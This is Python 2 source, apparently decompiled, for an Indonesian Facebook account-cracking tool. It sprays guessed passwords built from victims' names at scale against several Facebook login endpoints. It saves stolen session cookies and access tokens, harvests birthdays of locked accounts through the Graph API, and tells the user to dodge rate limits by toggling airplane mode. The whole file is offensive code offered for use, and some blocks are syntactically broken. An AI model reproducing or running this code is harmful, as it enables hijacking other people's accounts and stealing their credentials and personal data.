                        with ThreadPoolExecutor(max_workers = 30) as log:
                            for akun in self.id:
                                
                                try:
                                    _heck_ = akun.split('<=>')[0]
                                    log.submit(self.mobile, _heck_, brute)
                                continue
                                continue

                        os.remove(self.apk)
                        exit('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m FINISED')
                    elif ind in ('3', '03'):
                        print '\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Results OK di simpan di --> \x1b[0;36mOK/%s.txt' % waktu
                        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Results CP di simpam di --> \x1b[0;36mCP/%s.txt' % waktu
                        jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;31m On Of mode pesawat jika tidak ada hasil')
                        with ThreadPoolExecutor(max_workers = 30) as log:
                            for akun in self.id:
                                
                                try:
                                    _heck_ = akun.split('<=>')[0]
                                    log.submit(self.mobil, _heck_, brute)
                                continue
                                continue

                        os.remove(self.apk)
                        exit('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m FINISED')
                    else:
                        jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Wronk Input')
                        manual()

                jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Pilih method satu-satu\n')
                jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;31m Di sarankan menggunakan Mobile fb ')
                print '\n\x1b[0;36m[\x1b[0;00m01\x1b[0;36m]\x1b[0;00m B-API\x1b[0;36m Fast Crack'
                print '\x1b[0;36m[\x1b[0;00m02\x1b[0;36m]\x1b[0;00m Mbasic\x1b[0;36m Sellow Crack '
                print '\x1b[0;36m[\x1b[0;00m03\x1b[0;36m]\x1b[0;00m Mobile\x1b[0;36m Sellow Crack\x1b[0;33m Recomended V1\x1b[0;00m'
                print '\x1b[0;36m[\x1b[0;00m04\x1b[0;36m]\x1b[0;00m Mobile\x1b[0;36m Sellow Crack\x1b[0;33m Recomended V2\x1b[0;00m'
                manual(pwx.split(','))
                break
        elif je in ('o', 'O'):
            jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Pilih method satu-satu')
            jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;31m Disarankan menggunakan mobile fb')
            print '\n\x1b[0;36m[\x1b[0;00m01\x1b[0;36m]\x1b[0;00m B-Api\x1b[0;36m Fast Crack'
            print '\x1b[0;36m[\x1b[0;00m02\x1b[0;36m]\x1b[0;00m Mbasic\x1b[0;36m Sellow Crack'
            print '\x1b[0;36m[\x1b[0;00m03\x1b[0;36m]\x1b[0;00m Mobile\x1b[0;36m Sellow Crack\x1b[0;33m Recomended V1\x1b[0;00m'
            print '\x1b[0;36m[\x1b[0;00m04\x1b[0;36m]\x1b[0;00m Mobile\x1b[0;36m Sellow Crack\x1b[0;33m Recomended V2\x1b[0;00m'
            self.langsung()
        else:
            jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m WRONK INPUT :(')
            jeda(2)
            menu()

    
    def langsung(self):
        mrjeeckperudallaccountkegelapanxxznanowibu = raw_input('\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Method : ')
        if mrjeeckperudallaccountkegelapanxxznanowibu == '':
            print '\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m Wronk INput '
            self.langsung()
        elif mrjeeckperudallaccountkegelapanxxznanowibu in ('1', '01'):
            print '\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Results OK di simpan di --> \x1b[0;36mOK/%s.txt ' % waktu
            print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Results CP di simpan di -->\x1b[0;36m CP/%s.txt' % waktu
            jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;31m On Of mode pesawat jika tidak ada hasil')
            with ThreadPoolExecutor(max_workers = 30) as log:
                for akun in self.id:
                    
                    try:
                        (uid, name) = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 and len(_i_) == 4 and len(_i_) == 5 or len(_i_) == 6:
                            pwx = [
                                name,
                                _i_[0] + '123',
                                _i_[0] + '12345']
                        else:
                            pwx = [
                                name,
                                _i_[0] + '123',
                                _i_[0] + '12345']
                        log.submit(self.b_api, uid, pwx)
                    continue
                    continue

            os.remove(self.apk)
            exit('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m FINISED.......')
        elif mrjeeckperudallaccountkegelapanxxznanowibu in ('2', '02'):
            print '\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Results OK di simpan di --> \x1b[0;36mOK/%s.txt' % waktu
            print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Results CP di simpan di --> \x1b[0;36mCP/%s.txt' % waktu
            jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;31m On Of mode pesawat jika tidak ada hasil')
            with ThreadPoolExecutor(max_workers = 30) as log:
                for akun in self.id:
                    
                    try:
                        (uid, name) = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 and len(_i_) == 4 and len(_i_) == 5 or len(_i_) == 6:
                            pwx = [
                                name,
                                _i_[0] + '123',
                                _i_[0] + '12345']
                        else:
                            pwx = [
                                name,
                                _i_[0] + '123',
                                _i_[0] + '12345']
                        log.submit(self.basic, uid, pwx)
                    continue
                    continue

            os.remove(self.apk)
            exit('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m FINISED.....')
        elif mrjeeckperudallaccountkegelapanxxznanowibu in ('4', '04'):
            print '\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Results OK di simpan di --> \x1b[0;36mOK/%s.txt' % waktu
            print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Results CP di simpan di --> \x1b[0;36mCP/%s.txt' % waktu
            jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;31m On Of mode pesawat jika tidak ada hasil')
            with ThreadPoolExecutor(max_workers = 30) as log:
                for akun in self.id:
                    
                    try:
                        (uid, name) = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 and len(_i_) == 4 and len(_i_) == 5 or len(_i_) == 6:
                            pwx = [
                                name,
                                _i_[0] + '123',
                                _i_[0] + '12345']
                        else:
                            pwx = [
                                name,
                                _i_[0] + '123',
                                _i_[0] + '12345']
                        log.submit(self.mobile, uid, pwx)
                    continue
                    continue

            os.remove(self.apk)
            exit('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m FINISED.....')
        elif mrjeeckperudallaccountkegelapanxxznanowibu in ('3', '03'):
            print '\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Results OK di simpan di --> \x1b[0;36mOK/%s.txt ' % waktu
            print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Results CP di simpan di --> \x1b[0;36mCP/%s.txt ' % waktu
            jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;31m On Of mode pesawat jika tidak ada hasil')
            with ThreadPoolExecutor(max_workers = 30) as log:
                for akun in self.id:
                    
                    try:
                        (uid, name) = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 and len(_i_) == 4 and len(_i_) == 5 or len(_i_) == 6:
                            pwx = [
                                name,
                                _i_[0] + '123',
                                _i_[0] + '12345']
                        else:
                            pwx = [
                                name,
                                _i_[0] + '123',
                                _i_[0] + '12345']
                        log.submit(self.mobil, uid, pwx)
                    continue
                    continue

            os.remove(self.apk)
            exit('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m FINISED......')
        else:
            jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;33m Wronk Input')
            self.langsung()

    
    def b_api(self, user, manual):
        global loop
        
        try:
            ua = open('data/ua.txt', 'r').read()
        except IOError:
            ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'

        for pw in manual:
            pw = pw.lower()
            ses = requests.Session()
            header = {
                'user-agent': ua,
                'x-fb-connection-bandwidth': str(random.randint(20000, 40000)),
                'x-fb-sim-hni': str(random.randint(20000, 40000)),
                'x-fb-net-hni': str(random.randint(20000, 40000)),
                'x-fb-connection-quality': 'EXCELLENT',
                'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-http-engine': 'Liger' }
            bapi = 'https://b-api.facebook.com/method/auth.login'
            response = ses.get(bapi + '?format=json&email=' + user + '&password=' + pw + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = header)
            if response.status_code != 200:
                (jeeck('\r\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m Tolong hidupkam mode pesawat 2 detik'),)
                sys.stdout.flush()
                loop += 1
                b_api(self, user, manual)
            if 'session_key' in response.text and 'EAAA' in response.text:
                print '\r %s--> %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s ' % (B, user, pw, response.json()['access_token'])
                ok.append('%s \xe2\x80\xa2 %s \xe2\x80\xa2 %s' % (user, pw, response.json()['access_token']))
                open('OK/%s.txt' % waktu, 'a').write(' -->%s %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s\n' % (B, user, pw, response.json()['access_token']))
                break
                continue
                continue
            if 'www.facebook.com' in response.json()['error_msg']:
                
                try:
                    jeeckxd = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, jeeckxd)).json()['birthday']
                    (month, day, year) = lahir.split('/')
                    month = bulan12[month]
                    print '\r %s--> %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s  ' % (K, user, pw, day, month, year)
                    cp.append('%s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s' % (user, pw, day, month, year))
                    open('CP/%s.txt' % waktu, 'a').write(' --> %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s\n' % (user, pw, day, month, year))
                except KeyError:
                    day = ''
                    month = ''
                    year = ''
                except:
                    pass

                print '\r %s--> %s \xe2\x80\xa2 %s            ' % (K, user, pw)
                cp.append('%s \xe2\x80\xa2 %s' % (user, pw))
                open('CP/%s.txt' % waktu, 'a').write(' --> %s \xe2\x80\xa2 %s\n' % (user, pw))
                break
                continue
                continue
        loop += 1
        print '\r%s proses%s %s/%s [OK:%s] <--> [CP:%s]' % (B, P, loop, len(self.id), len(ok), len(cp)),
        sys.stdout.flush()

    
    def basic(self, user, manual):
        global loop
        
        try:
            ua = open('data/ua.txt', 'r').read()
        except IOError:
            ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'

        for pw in manual:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({
                'Host': 'mbasic.facebook.com',
                'cache-control': 'max-age=0',
                'upgrade-insecure-requests': '1',
                'user-agent': ua,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'accept-encoding': 'gzip, deflate',
                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' })
            p = ses.get('https://mbasic.facebook.com')
            b = ses.post('https://mbasic.facebook.com/login.php', data = {
                'email': user,
                'pass': pw,
                'login': 'submit' })
            if 'c_user' in ses.cookies.get_dict().keys():
                kuki = ';'.join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %s--> %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s  ' % (B, user, pw, kuki)
                ok.append('%s \xe2\x80\xa2 %s \xe2\x80\xa2 %s' % (user, pw, kuki))
                open('OK/%s.txt' % waktu, 'a').write(' --> %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s\n' % (user, pw, kuki))
                break
                continue
                continue
            if 'checkpoint' in ses.cookies.get_dict().keys():
                
                try:
                    jeeckxd = open('data/token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, jeeckxd)).json()['birthday']
                    (day, month, year) = lahir.split('/')
                    month = bulan12[month]
                    print '\r %s--> %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s ' % (K, user, pw, day, month, year)
                    cp.append('%s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s' % (user, pw, day, month, year))
                    open('CP/%s.txt' % waktu, 'a').write(' --> %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s\n' % (user, pw, day, month, year))
                except KeyError:
                    day = ''
                    month = ''
                    year = ''
                except:
                    pass

                print '\r %s--> %s \xe2\x80\xa2 %s            ' % (K, user, pw)
                cp.append('%s \xe2\x80\xa2 %s' % (user, pw))
                open('CP/%s.txt' % waktu, 'a').write(' --> %s \xe2\x80\xa2 %s\n' % (user, pw))
                break
                continue
                continue
        loop += 1
        print '\r%s proses%s %s/%s [OK:%s] <--> [CP:%s]' % (B, P, loop, len(self.id), len(ok), len(cp)),
        sys.stdout.flush()

    
    def mobil(self, user, manual):
        global loop
        for pw in manual:
            pw = pw.lower()
            session = requests.Session()
            session.headers.update({
                'Host': 'm.facebook.com',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'dnt': '1',
                'x-requested-with': 'mark.via.gp',
                'sec-fetch-site': 'none',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'sec-fetch-dest': 'document',
                'referer': 'https://developers.facebook.com/',
                'accept-encoding': 'gzip, deflate',
                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' })
            p = session.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2debug%2Faccesstoken%2F').text
            dataa = {
                'lsd': re.search('name="lsd" value="(.*?)"', str(p)).group(1),
                'jazoest': re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
                'uid': user,
                'flow': 'login_no_pin',
                'pass': pw,
                'next': 'https://developers.facebook.com/tools/debug/accesstoken/' }
            session.headers.update({
                'Host': 'm.facebook.com',
                'cache-control': 'max-age=0',
                'upgrade-insecure-requests': '1',
                'origin': 'https://m.facebook.com',
                'content-type': 'application/x-www-form-urlencoded',
                'user-agent': 'Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'x-requested-with': 'mark.via.gp',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'sec-fetch-dest': 'document',
                'referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F',
                'accept-encoding': 'gzip, deflate',
                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' })
            po = session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data = dataa, allow_redirects = False)
            if 'c_user' in session.cookies.get_dict():
                coki = ';'.join([ key + '=' + value for key, value in session.cookies.get_dict().items() ])
                print '\r %s--> %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s  ' % (B, user, pw, coki)
                ok.append('%s \xe2\x80\xa2 %s \xe2\x80\xa2 %s' % (user, pw, coki))
                open('OK/%s.txt' % waktu, 'a').write(' --> %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s\n' % (user, pw, coki))
                if infoong == 'y':
                    cek_cookies_by_risky(user, coki, zczc)
                else:
                    print zczc
                    akun_ok(user, pw, coki)
                break
                continue
            if 'checkpoint' in session.cookies.get_dict():
                
                try:
                    kontol = open('data/token.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s' % (user, kontol)).json()['birthday']
                    (month, day, year) = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r %s--> %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s ' % (K, user, pw, day, month, year)
                    cp.append('%s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s' % (user, pw, day, month, year))
                    open('CP/%s.txt' % waktu, 'a').write(' --> %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s\n' % (user, pw, day, month, year))
                except (KeyError, IOError):
                    month = ''
                    day = ''
                    year = ''
                except:
                    pass

                print '\r %s--> %s \xe2\x80\xa2 %s            ' % (K, user, pw)
                cp.append('%s \xe2\x80\xa2 %s' % (user, pw))
                open('CP/%s.txt' % waktu, 'a').write(' --> %s \xe2\x80\xa2 %s\n' % (user, pw))
                break
                continue
                continue
        loop += 1
        print '\r%s proses%s %s/%s [OK:%s] <--> [CP:%s]' % (B, P, loop, len(self.id), len(ok), len(cp)),
        sys.stdout.flush()

    
    def mobile(self, user, manual):
        global loop
        for pw in manual:
            pw = pw.lower()
            session = requests.Session()
            session.headers.update({
                'Host': 'm.facebook.com',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'dnt': '1',
                'x-requested-with': 'mark.via.gp',
                'sec-fetch-site': 'none',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'sec-fetch-dest': 'document',
                'referer': 'https://developers.facebook.com/',
                'accept-encoding': 'gzip, deflate',
                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' })
            p = session.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
            dataa = {
                'lsd': re.search('name="lsd" value="(.*?)"', str(p)).group(1),
                'jazoest': re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
                'uid': user,
                'flow': 'login_no_pin',
                'pass': pw,
                'next': 'https://developers.facebook.com/tools/debug/accesstoken/' }
            session.headers.update({
                'Host': 'm.facebook.com',
                'cache-control': 'max-age=0',
                'upgrade-insecure-requests': '1',
                'origin': 'https://m.facebook.com',
                'content-type': 'application/x-www-form-urlencoded',
                'user-agent': 'Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'x-requested-with': 'mark.via.gp',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'sec-fetch-dest': 'document',
                'referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F',
                'accept-encoding': 'gzip, deflate',
                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' })
            po = session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data = dataa, allow_redirects = False)
            if 'c_user' in session.cookies.get_dict():
                coki = ';'.join([ key + '=' + value for key, value in session.cookies.get_dict().items() ])
                print '\r %s--> %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s  ' % (B, user, pw, coki)
                ok.append('%s \xe2\x80\xa2 %s \xe2\x80\xa2 %s' % (user, pw, coki))
                open('OK/%s.txt' % waktu, 'a').write(' --> %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s\n' % (user, pw, coki))
                continue
            if 'checkpoint' in session.cookies.get_dict():
                
                try:
                    kontol = open('data/token.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s' % (user, kontol)).json()['birthday']
                    (month, day, year) = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r %s--> %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s ' % (K, user, pw, day, month, year)
                    cp.append('%s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s' % (user, pw, day, month, year))
                    open('CP/%s.txt' % waktu, 'a').write(' --> %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s\n' % (user, pw, day, month, year))
                except (KeyError, IOError):
                    month = ''
                    day = ''
                    year = ''
                except:
                    pass

                print '\r %s--> %s \xe2\x80\xa2 %s            ' % (K, user, pw)
                cp.append('%s \xe2\x80\xa2 %s' % (user, pw))
                open('CP/%s.txt' % waktu, 'a').write(' --> %s \xe2\x80\xa2 %s\n' % (user, pw))
                break
                continue
                continue
        loop += 1
        print '\r%s proses%s %s/%s [OK:%s] <--> [CP:%s]' % (B, P, loop, len(self.id), len(ok), len(cp)),
        sys.stdout.flush()



def jeeck_log(user, pw, opsi_):
    ua = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36'
    mb = 'https://mbasic.facebook.com'
    ses = requests.Session()
    ses.headers.update({
        'Host': 'mbasic.facebook.com',
        'cache-control': 'max-age=0',
        'upgrade-insecure-requests': '1',
        'origin': mb,
        'content-type': 'application/x-www-form-urlencoded',
        'user-agent': ua,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'x-requested-with': 'mark.via.gp',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'referer': mb + '/login/?next&ref=dbl&fl&refid=8',
        'accept-encoding': 'gzip, deflate',
        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' })
    data = { }
    ged = parser(ses.get(mb + '/login/?next&ref=dbl&fl&refid=8', headers = {
        'user-agent': ua }).text, 'html.parser')
    fm = ged.find('form', {
        'method': 'post' })
    list = [
        'lsd',
        'jazoest',
        'm_ts',
        'li',
        'try_number',
        'unrecognized_tries',
        'login',
        'bi_xrwh']
    for _i_ in fm.find_all('input'):
        if i.get('name') in list:
            data.update({
                _i_.get('name'): _i_.get('value') })
            continue
            continue
    data.update({
        'email': user,
        'pass': pw })
    
    try:
        run = parser(ses.post(mb + fm.get('action'), data = data, allow_redirects = True).text, 'html.parser')
    except requests.exceptions.TooManyRedirects:
        print '%s\xe2\x80\xa2 redirect overload ' % M

    if 'c_user' in ses.cookies:
        kuki = ';'.join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
        run = 'https://mbasic.facebook.com/settings/apps/tabbed/?tab=active'
        otw = ses.get(run, cookies = {
            'cookie': kuki })
        gem = parser(otw.content, 'html.parser')
        apk = gem.find('form', method = 'post')
        print '%s%s Berhasill <>  %s ' % (B, til, kuki)
        jeda(0.07)
        _no_ = 0
        for app in apk.find_all('h3'):
            data = app.find('span')
            _no_ += 1
            jeeck('  %s0%s. %s%s ' % (P, str(_no_), H, data))
        
    elif 'checkpoint' in ses.cookies:
        form = run.find('form')
        dtsg = form.find('input', {
            'name': 'fb_dtsg' })['value']
        jzst = form.find('input', {
            'name': 'jazoest' })['value']
        nh = form.find('input', {
            'name': 'nh' })['value']
        dataD = {
            'fb_dtsg': dtsg,
            'fb_dtsg': dtsg,
            'jazoest': jzst,
            'jazoest': jzst,
            'checkpoint_data': '',
            'submit[Continue]': 'Lanjutkan',
            'nh': nh }
        xnxx = parser(ses.post(mb + form['action'], data = dataD).text, 'html.parser')
        ngew = [ yy.text for yy in xnxx.find_all('option') ]
        opsi = []
        opsi_cek = []
        for _o_ in range(len(ngew)):
            opsi_cek.append('\n  %s0%s. %s%s ' % (P, str(_o_ + 1), K, ngew[_o_]))
        
        print opsi_ + ''.join(opsi_cek)
    elif 'login_error' in str(run):
        pass


def jeeck_cp():
    dirs = os.listdir('CP')
    for file in dirs:
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m --> \x1b[0;36m%s ' % file
    
    
    try:
        print '\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Nama file ( contoh : \x1b[0;36m%s \x1b[0;00m) --> \x1b[0;33mhasil hari ini : \x1b[0;36m%s ' % (waktu, waktu)
        opsi()
    except NameError:
        jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;33m File Not Faund ')
        exit()



def opsi():
    CP = 'CP/'
    jeeckxtampan = raw_input('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m Name File : ')
    if jeeckxtampan == '':
        jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m Wronk Input')
        jeda(2)
        opsi()
    
    try:
        jeeck_cp = open(CP + jeeckxtampan, 'r').readlines()
    except IOError:
        exit('\n%s[%s+%s] nama file %s tidak tersedia' % (B, J, B, jeeckxtampan))

    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90[JEECK X NANO]\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90')
    print '%s[%s+%s]%s Total Account %s: %s%s' % (B, J, B, P, M, P, len(jeeck_cp))
    jeda(2)
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90[JEECK X NANO]\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90')
    for fb in jeeck_cp:
        akun = fb.replace('\n', '')
        ngecek = akun.split(' \xe2\x80\xa2 ')
        print '\n%s[%s+%s]%s Proses pengecekan akun %s: %s%s' % (B, J, B, P, M, K, akun.replace(' --> ', ''))
        jeda(0.07)
        
        try:
            mengecek(ngecek[0].replace(' --> ', ''), ngecek[1])
        continue
        except requests.exceptions.ConnectionError:
            continue
        

    
    print '\n%s[%s+%s] FINISED ' % (B, J, B)
    jeda(0.07)
    raw_input('\n%s[%s+%s] \x1b[0;33m[%s Enter \x1b[0;33m] ' % (B, J, B, U))
    jeda(0.07)
    menu()


def mengecek(user, pw):
    mb = 'https://mbasic.facebook.com'
